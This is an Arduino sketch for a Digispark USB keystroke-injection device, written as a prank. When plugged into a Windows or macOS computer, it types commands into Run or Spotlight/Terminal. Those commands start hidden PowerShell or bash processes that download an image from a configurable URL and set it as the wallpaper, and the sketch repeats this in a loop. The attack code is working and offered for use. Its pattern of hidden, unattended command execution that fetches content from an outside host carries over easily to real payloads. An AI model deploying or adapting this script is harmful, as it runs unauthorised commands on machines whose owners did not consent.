#include "DigiKeyboard.h"

#define KEY_TAB 0x2b

// CHANGE THIS URL TO YOUR DESIRED WALLPAPER
const char* WALLPAPER_URL = "https://picsum.photos/1920/1080";

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Try Windows first
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(300);
  
  // Windows PowerShell method (hidden)
  DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"& { try { Invoke-WebRequest -Uri '");
  DigiKeyboard.print(WALLPAPER_URL);
  DigiKeyboard.println("' -OutFile '$env:USERPROFILE\\Downloads\\wallpaper.jpg' -UseBasicParsing; Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'Wallpaper' -Value '$env:USERPROFILE\\Downloads\\wallpaper.jpg'; Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'WallpaperStyle' -Value '2'; rundll32.exe user32.dll,UpdatePerUserSystemParameters } catch { } }\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000); // Wait for Windows operation to complete

  // Try macOS (Cmd+Space for Spotlight)
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Cmd+Space
  DigiKeyboard.delay(500);
  DigiKeyboard.println("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // macOS hidden execution
  DigiKeyboard.print("nohup bash -c 'curl -s -o ~/Desktop/wallpaper.jpg \"");
  DigiKeyboard.print(WALLPAPER_URL);
  DigiKeyboard.println("\" && osascript -e \"tell application \\\"System Events\\\" to tell every desktop to set picture to \\\"~/Desktop/wallpaper.jpg\\\"\"' >/dev/null 2>&1 & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  digitalWrite(1, HIGH); // Turn on LED when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
